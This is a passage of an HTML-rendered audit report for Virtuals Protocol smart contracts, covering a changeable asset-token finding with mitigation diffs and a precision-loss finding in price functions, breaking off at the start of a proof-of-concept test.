class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eClones\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclone\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Initialising agent token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenSupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenTaxParams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallTradingTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis cannot be mitigated with current implementation as Base has a private mempool, the protocol in no capacity can guarantee that before \u003ccode\u003esetAssetToken\u003c/code\u003e all tokens are withdrawn by the \u003ccode\u003eWITHDRAW_ROLE\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAlso, these issues are commonly found inside the \u003ccode\u003eAgentFactoryV3\u003c/code\u003e and \u003ccode\u003eAgentFactoryV4\u003c/code\u003e contracts.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended that instead of using a public variable of \u003ccode\u003eassetToken\u003c/code\u003e in function calls other than \u003ccode\u003eproposeAgent\u003c/code\u003e, add the asset token’s address directly inside the \u003ccode\u003eApplication\u003c/code\u003e struct and fetch it, as these calls anyways use the \u003ccode\u003eApplication\u003c/code\u003e struct’s mapping:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"116\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    struct Application {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string name;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string symbol;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string tokenURI;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        address tokenAddress;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ApplicationStatus status;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 withdrawableAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address proposer;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint8[] cores;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 proposalEndBlock;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 virtualId;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bytes32 tbaSalt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address tbaImplementation;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint32 daoVotingPeriod;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 daoThreshold;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003ewithdraw\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"117\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function withdraw(uint256 id) public noReentrant {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        Application storage application = _applications[id];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(msg.sender == application.proposer || hasRole(WITHDRAW_ROLE, msg.sender), \u0026quot;Not proposer\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(application.status == ApplicationStatus.Active, \u0026quot;Application is not active\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(block.number \u0026gt; application.proposalEndBlock, \u0026quot;Application is not matured yet\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 withdrawableAmount = application.withdrawableAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        application.withdrawableAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        application.status = ApplicationStatus.Withdrawn;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        IERC20(assetToken).safeTransfer(application.proposer, withdrawableAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        IERC20(application.tokenAddress).safeTransfer(application.proposer, withdrawableAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003eexecuteApplication\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"118\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function executeApplication(uint256 id, bool canStake) public noReentrant {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // C2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address lp = IAgentToken(token).liquidityPools()[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        IERC20(assetToken).transfer(token, initialAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        IERC20(application.tokenAddress).transfer(token, initialAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IAgentToken(token).addInitialLiquidity(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003e_createNewAgentToken\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"119\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- function _createNewAgentToken(string memory name, string memory symbol) internal returns (address instance) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ function _createNewAgentToken(string memory name, string memory symbol, address memory applicationAssetToken) internal returns (address instance) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        instance = Clones.clone(tokenImplementation);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IAgentToken(instance).initialize(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            [_tokenAdmin, _uniswapRouter, assetToken],          \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            [_tokenAdmin, _uniswapRouter, applicationAssetToken],          \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            abi.encode(name, symbol),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _tokenSupplyParams,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _tokenTaxParams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        allTradingTokens.push(instance);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return instance;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis would ensure that changing \u003ccode\u003eassetToken\u003c/code\u003e does not break any flow.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-24-precision-loss-in-pricealast-and-priceblast\" style=\"position:relative;\"\u003e\u003ca href=\"#m-24-precision-loss-in-pricealast-and-priceblast\" aria-label=\"m 24 precision loss in pricealast and priceblast permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-196\"\u003e[M-24] Precision loss in \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-592\"\u003ehecker_trieu_tien\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-551\"\u003e0xterrah\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-354\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-466\"\u003ePotEater\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-271\"\u003erayss\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-8\" aria-label=\"finding description and impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe price calculation functions \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e use integer division (\u003ccode\u003e/\u003c/code\u003e) directly on the pool reserves (\u003ccode\u003e_pool.reserve0\u003c/code\u003e, \u003ccode\u003e_pool.reserve1\u003c/code\u003e). Integer division in Solidity truncates any fractional part of the result, leading to significant precision loss.\t\u003c/p\u003e\n\u003ch3 id=\"scenario\" style=\"position:relative;\"\u003e\u003ca href=\"#scenario\" aria-label=\"scenario permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScenario\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThe pool has reserves \u003ccode\u003e_pool.reserve1 = 199 * 10**18\u003c/code\u003e and \u003ccode\u003e_pool.reserve0 = 100 * 10**18\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eA call to \u003ccode\u003epriceALast()\u003c/code\u003e executes \u003ccode\u003e_pool.reserve1 / _pool.reserve0\u003c/code\u003e which is \u003ccode\u003e(199 * 10**18) / (100 * 10**18)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDue to integer division, the result is truncated from the actual price (1.99) to \u003ccode\u003e1\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAlternatively, if \u003ccode\u003e_pool.reserve1 = 99 * 10**18\u003c/code\u003e and \u003ccode\u003e_pool.reserve0 = 100 * 10**18\u003c/code\u003e, the calculation \u003ccode\u003e(99 * 10**18) / (100 * 10**18)\u003c/code\u003e results in \u003ccode\u003e0\u003c/code\u003e because integer division rounds down. The same logic applies symmetrically to \u003ccode\u003epriceBLast\u003c/code\u003e when \u003ccode\u003e_pool.reserve0\u003c/code\u003e is divided by \u003ccode\u003e_pool.reserve1\u003c/code\u003e.\t\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo fix this issue, the contract should use a fixed-point arithmetic approach. Scale the numerator by a large factor (e.g., \u003ccode\u003e10^18\u003c/code\u003e) before division.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-17\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"120\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;Price Calculation Precision Loss\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should demonstrate precision loss in priceALast function\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan 